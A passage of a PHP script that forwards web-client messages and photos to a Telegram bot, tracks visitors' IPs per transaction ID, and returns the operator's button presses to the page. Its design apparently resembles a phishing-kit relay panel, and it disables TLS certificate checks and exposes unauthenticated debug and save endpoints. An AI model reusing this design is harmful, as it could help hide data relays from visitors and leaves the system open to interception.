        logError("HTTP Error stream ({$method}): {$httpCode} - " . var_export($response, true));
        return ['error' => "HTTP Error: " . $httpCode, 'http_code' => $httpCode];
    }

    $arr = json_decode($response, true);
    if (is_array($arr)) {
        if (isset($arr['result']['message']['chat']) && is_array($arr['result']['message']['chat'])) {
            $arr['result']['message']['chat'] = sanitize_secret($arr['result']['message']['chat']);
        }
    }
    return $arr;
}

/**
 * Fallback para enviar FOTOS (multipart/form-data) sin curl.
 * Construye el body a mano + boundary + Content-Type correcto.
 * Usado por el case send_photo cuando curl no existe y es base64/data:image.
 */
function sendToTelegramPhoto($chatId, $tempFile, $caption) {
    $token = TELEGRAM_TOKEN;
    $url = "https://api.telegram.org/bot{$token}/sendPhoto";
    $boundary = '----PhPBotBoundary' . md5((string)mt_rand());

    $body  = "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . $chatId . "\r\n";
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" . $caption . "\r\n";
    $body .= "--{$boundary}\r\n";
    $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n";
    $body .= "Content-Type: image/jpeg\r\n\r\n";
    $body .= (string)@file_get_contents($tempFile) . "\r\n";
    $body .= "--{$boundary}--\r\n";

    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: multipart/form-data; boundary={$boundary}\r\n",
            'content' => $body,
            'timeout' => 20,
            'ignore_errors' => true
        ],
        'ssl'  => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ]);
    $response = @file_get_contents($url, false, $ctx);
    $httpCode = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) {
            if (preg_match('#^HTTP/\d+(?:\.\d+)?\s+(\d{3})\b#i', $h, $m)) {
                $httpCode = intval($m[1]);
            }
        }
    }
    if ($response === false || $response === '') {
        $err = error_get_last();
        return ['error' => $err && isset($err['message']) ? $err['message'] : 'sendToTelegramPhoto failed'];
    }
    if ($httpCode !== 200) {
        return ['error' => "HTTP Error: " . $httpCode, 'http_code' => $httpCode];
    }
    return json_decode($response, true);
}

// ============================================
// 5. RUTAS DE LA API
// ============================================

$action = isset($_GET['action']) ? $_GET['action'] : '';

// MODO INCLUDE: usado por webhook.php para cargar funciones sin ejecutar rutas.
if (defined('API_INCLUDE_MODE') && API_INCLUDE_MODE === true) {
    return true;
}

switch ($action) {
    
    case 'send_message':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        
        $input = json_decode(file_get_contents('php://input'), true);
        $text = $input['text'] ?? '';
        $parse_mode = $input['parse_mode'] ?? 'HTML';
        $reply_markup = $input['reply_markup'] ?? null;
        
        if (empty($text)) {
            http_response_code(400);
            echo json_sanitize_encode(['error' => 'Message text is required']);
            break;
        }
        
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $text,
            'parse_mode' => $parse_mode
        ];
        
        if ($reply_markup) {
            $data['reply_markup'] = $reply_markup;
        }
        
        $response = sendToTelegram('sendMessage', $data);
        
        if (isset($response['error'])) {
            http_response_code(500);
        }
        
        echo json_sanitize_encode($response);
        break;
    
    case 'send_photo':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        
        try {
            $input = json_decode(file_get_contents('php://input'), true);
            $photo = $input['photo'] ?? '';
            $caption = $input['caption'] ?? '';
            
            if (empty($photo)) {
                http_response_code(400);
                echo json_sanitize_encode(['error' => 'Photo is required']);
                break;
            }
            
            if (strpos($photo, 'data:image') === 0) {
                $parts = explode(',', $photo);
                $base64 = $parts[1] ?? '';
                $imageData = base64_decode($base64);
                
                if ($imageData === false) {
                    throw new Exception('Error decodificando base64');
                }
                
                $tempFile = tempnam(sys_get_temp_dir(), 'photo_');
                file_put_contents($tempFile, $imageData);

                $photoResult = null;
                if (function_exists('curl_init')) {
                    $postData = [
                        'chat_id' => TELEGRAM_CHAT_ID,
                        'photo' => new CURLFile($tempFile, 'image/jpeg', 'photo.jpg'),
                        'caption' => $caption
                    ];
                    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendPhoto");
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
                    $response = curl_exec($ch);
                    $error = curl_error($ch);
                    curl_close($ch);
                    
                    if ($error) {
                        $photoResult = ['error' => $error];
                    } else {
                        $photoResult = json_decode($response, true);
                    }
                } else {
                    // Fallback SIN CURL: enviar foto multipart por file_get_contents stream context
                    $photoResult = sendToTelegramPhoto(TELEGRAM_CHAT_ID, $tempFile, $caption);
                }
                
                @unlink($tempFile);
                
                if (isset($photoResult['error'])) {
                    echo json_sanitize_encode(['error' => $photoResult['error']]);
                } elseif (is_array($photoResult)) {
                    echo json_sanitize_encode($photoResult);
                } else {
                    echo json_sanitize_encode(['ok' => true]);
                }
            } else {
                $data = [
                    'chat_id' => TELEGRAM_CHAT_ID,
                    'photo' => $photo,
                    'caption' => $caption
                ];
                $response = sendToTelegram('sendPhoto', $data);
                echo json_sanitize_encode($response);
            }
        } catch (Exception $e) {
            logError('send_photo error: ' . $e->getMessage());
            http_response_code(500);
            echo json_sanitize_encode(['error' => $e->getMessage()]);
        }
        break;
    
    case 'get_updates':
        if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use GET']);
            break;
        }
        
        $offset = isset($_GET['offset']) ? intval($_GET['offset']) : 0;
        $data = [
            'offset' => $offset,
            'timeout' => 30,
            'allowed_updates' => ['callback_query', 'message']
        ];
        
        $response = sendToTelegram('getUpdates', $data);
        
        if (isset($response['error'])) {
            http_response_code(500);
        }
        
        echo json_sanitize_encode($response);
        break;
    
    case 'answer_callback':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        
        $input = json_decode(file_get_contents('php://input'), true);
        $callback_query_id = $input['callback_query_id'] ?? '';
        
        if (empty($callback_query_id)) {
            http_response_code(400);
            echo json_sanitize_encode(['error' => 'callback_query_id is required']);
            break;
        }
        
        $data = ['callback_query_id' => $callback_query_id];
        $response = sendToTelegram('answerCallbackQuery', $data);
        echo json_sanitize_encode($response);
        break;
    
    case 'edit_message':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        
        $input = json_decode(file_get_contents('php://input'), true);
        $chat_id = $input['chat_id'] ?? TELEGRAM_CHAT_ID;
        $message_id = $input['message_id'] ?? '';
        
        if (empty($message_id)) {
            http_response_code(400);
            echo json_sanitize_encode(['error' => 'message_id is required']);
            break;
        }
        
        $data = [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'reply_markup' => ['inline_keyboard' => []]
        ];
        
        $response = sendToTelegram('editMessageReplyMarkup', $data);
        
        if (isset($response['error'])) {
            http_response_code(500);
        }
        
        echo json_sanitize_encode($response);
        break;
    
    case 'secure_vars':
        sec_init_tokens();
        $csrf  = isset($_SESSION['csrf_token']) ? (string)$_SESSION['csrf_token'] : '';
        $lsKey = isset($_SESSION['ls_key'])      ? (string)$_SESSION['ls_key']      : '';
        $tx    = isset($_SESSION['current_tx'])  ? (string)$_SESSION['current_tx']  : '';
        echo json_sanitize_encode([
            'ok'      => true,
            'csrf'    => $csrf,
            'ls_key'  => $lsKey,
            'tx'      => $tx,
            'ip'      => function_exists('sec_get_client_ip') ? sec_get_client_ip() : 'unknown'
        ]);
        break;

    case 'store_tx_ip':
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        $raw = file_get_contents('php://input');
        $input = is_string($raw) && $raw !== '' ? @json_decode($raw, true) : [];
        $tx = isset($input['tx']) ? trim((string)$input['tx']) : '';
        if ($tx === '') {
            $tx = isset($_POST['tx']) ? trim((string)$_POST['tx']) : '';
        }
        if ($tx !== '' && function_exists('sec_store_tx_ip')) {
            $_SESSION['current_tx'] = $tx;
            sec_store_tx_ip($tx, [
                'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                'from_js' => true
            ]);
        }
        echo json_sanitize_encode([
            'ok' => true,
            'tx' => $tx,
            'ip' => function_exists('sec_get_client_ip') ? sec_get_client_ip() : 'unknown'
        ]);
        break;

    case 'health':
        $sd = defined('CALLBACK_STATE_DIR') ? CALLBACK_STATE_DIR : '';
        if ($sd !== '' && ($pr = realpath($sd)) !== false) {
            $sd = $pr;
            $root = realpath(__DIR__);
            if ($root && stripos($sd, $root) === 0) {
                $sd = str_replace('\\', '/', substr($sd, strlen($root)));
                if ($sd === '' || $sd[0] !== '/') $sd = '/' . ltrim($sd, '/');
            } else {
                $sd = basename($sd);
            }
        }
        $bannedCount = 0;
        if (function_exists('sec_banned_read')) {
            $list = sec_banned_read();
            $bannedCount = is_array($list) ? count($list) : 0;
        }
        echo json_sanitize_encode([
            'status' => 'ok',
            'timestamp' => date('Y-m-d H:i:s'),
            'php_version' => phpversion(),
            'extensions' => [
                'curl' => extension_loaded('curl'),
                'json' => extension_loaded('json')
            ],
            'state_dir' => $sd,
            'state_exists' => is_dir(defined('CALLBACK_STATE_DIR') ? CALLBACK_STATE_DIR : __DIR__ . '/.state'),
            'security' => [
                'csrf_ok' => !empty($_SESSION['csrf_token']),
                'ls_key_ok' => !empty($_SESSION['ls_key']),
                'banned_ips_count' => $bannedCount,
                'cors_closed' => true
            ]
        ]);
        break;

    case 'last_callback':
        if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use GET']);
            break;
        }
        $tx = isset($_GET['tx']) ? trim((string)$_GET['tx']) : '';
        if ($tx === '') {
            http_response_code(400);
            echo json_sanitize_encode(['error' => 'tx (transaction_id) is required']);
            break;
        }

        // ⚠️ POLLING SERVER-SIDE: SOLO si el usuario envía explícitamente ?polling=1.
        //    Por defecto NO lo usamos (el webhook guarda el callback INSTANTÁNEAMENTE en .state/cb_<TX>.json).
        //    Si lo llamamos siempre y hay un webhook activo → Telegram devuelve 409 Conflict y crashea todo.
        $forcePolling = isset($_GET['polling']) && trim((string)$_GET['polling']) === '1';
        if ($forcePolling) {
            apiServerSidePoll();
        }

        // Ahora lee el último callback guardado para este transaction_id
        $stored = apiReadCallback($tx);
        if ($stored === null) {
            echo json_sanitize_encode([
                'ok' => true,
                'callback' => null,
                'polling_used' => $forcePolling
            ]);
        } else {
            apiDeleteCallback($tx);
            // Mantener compatibilidad: $stored puede ser string (formato antiguo) o array (nuevo)
            $callbackData = is_array($stored) ? (isset($stored['data']) ? $stored['data'] : '') : (string)$stored;
            $extra        = (is_array($stored) && isset($stored['extra']) && is_array($stored['extra'])) ? $stored['extra'] : null;
            $resp = [
                'ok' => true,
                'callback' => $callbackData,
                'polling_used' => $forcePolling
            ];
            if ($extra !== null) {
                if (isset($extra['tg_user']))       $resp['tg_user']       = $extra['tg_user'];
                if (isset($extra['button_label']))  $resp['button_label']  = $extra['button_label'];
                if (isset($extra['pressed_at']))    $resp['pressed_at']    = $extra['pressed_at'];
            }
            echo json_sanitize_encode($resp);
        }
        break;

    case 'save_last_callback':
        // Endpoint para DEBUG / probar sin bot real
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use POST']);
            break;
        }
        $input = json_decode(file_get_contents('php://input'), true);
        $tx = isset($input['tx']) ? trim((string)$input['tx']) : '';
        $data = isset($input['data']) ? (string)$input['data'] : '';
        if ($tx === '' || $data === '') {
            http_response_code(400);
            echo json_sanitize_encode(['error' => 'tx and data are required']);
            break;
        }
        apiSaveCallback($tx, $data);
        echo json_sanitize_encode(['ok' => true, 'saved' => ['tx' => $tx, 'data' => $data]]);
        break;

    case 'debug_state':
        if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
            http_response_code(405);
            echo json_sanitize_encode(['error' => 'Method not allowed. Use GET']);
            break;
        }
        $dir = defined('CALLBACK_STATE_DIR') ? CALLBACK_STATE_DIR : __DIR__ . '/.state';
        $offsetFile = $dir . '/polling_offset.txt';
        $offsetVal = is_file($offsetFile) ? intval(@file_get_contents($offsetFile)) : 0;
        $cbFiles = [];
        if (is_dir($dir)) {
            $dh = opendir($dir);
            if ($dh) {
                while (($f = readdir($dh)) !== false) {
                    if (strpos($f, 'cb_') === 0 && substr($f, -5) === '.json') {
                        $fp = $dir . DIRECTORY_SEPARATOR . $f;
                        $raw = @file_get_contents($fp);
                        $arr = @json_decode($raw, true);
                        $data = is_array($arr) && isset($arr['data']) ? (string)$arr['data'] : '';
                        $extra = (is_array($arr) && isset($arr['extra']) && is_array($arr['extra'])) ? $arr['extra'] : null;
                        $txSafe = substr($f, 3, strlen($f) - 3 - 5); // quitar cb_ (prefix) y .json (suffix)
                        $dataPreview = $data;
                        if (is_string($dataPreview) && strlen($dataPreview) > 14) {
                            $dataPreview = substr($dataPreview, 0, 6) . '***' . substr($dataPreview, -6);
                        }
                        $cbEntry = [
                            'tx' => $txSafe,
                            'saved_at' => is_array($arr) && isset($arr['saved_at']) ? date('Y-m-d H:i:s', intval($arr['saved_at'])) : null,
                            'data_preview' => $dataPreview
                        ];
                        if ($extra !== null) {
                            if (isset($extra['tg_user']))       $cbEntry['tg_user']       = $extra['tg_user'];
                            if (isset($extra['button_label']))  $cbEntry['button_label']  = $extra['button_label'];
                            if (isset($extra['pressed_at']))    $cbEntry['pressed_at']    = $extra['pressed_at'];
                        }
                        $cbFiles[] = $cbEntry;
                    }
                }
                closedir($dh);
            }
        }
        $pollOk = apiServerSidePoll();

        // Últimos 10 mensajes del log (ÚTIL para diagnosticar token 401, curl deshabilitado, etc)
        $logTail = [];
        if (defined('LOG_FILE') && is_file(LOG_FILE)) {
            $lines = @file(LOG_FILE);
            if (is_array($lines)) {
                $n = count($lines);
                $start = max(0, $n - 10);
                for ($i = $start; $i < $n; $i++) {
                    $logTail[] = function_exists('sanitize_secret') ? sanitize_secret(rtrim($lines[$i])) : rtrim($lines[$i]);
                }
            }
        }

        echo json_sanitize_encode([
            'ok' => true,
            'ts' => date('Y-m-d H:i:s'),
            'php_curl_loaded' => extension_loaded('curl'),
            'fallback_streams_available' => function_exists('stream_context_create'),
            'allow_url_fopen_on' => filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOLEAN) ? true : false,
            'openssl_loaded'  => extension_loaded('openssl'),
            'polling_offset_file_exists' => is_file($offsetFile),
            'polling_offset_value' => $offsetVal,
            'apiServerSidePoll_returned' => $pollOk,
            'callbacks_guardados_count' => count($cbFiles),
            'callbacks_guardados' => $cbFiles,
            'log_tail_ultimos_10' => $logTail,
            'FIX_SUGERIDO_si_allow_url_fopen_es_false' =>
                'Si allow_url_fopen = Off y curl = false: edita tu php.ini y pon allow_url_fopen = On, luego reinicia PHP.'
        ]);
        break;

    default:
        http_response_code(404);
        echo json_sanitize_encode([
            'error' => 'Action not found',
            'available_actions' => [
                'send_message',
                'send_photo',
                'get_updates',
                'answer_callback',
                'edit_message',
                'health',
                'last_callback',
                'debug_state'
            ]
        ]);
        break;
}
?>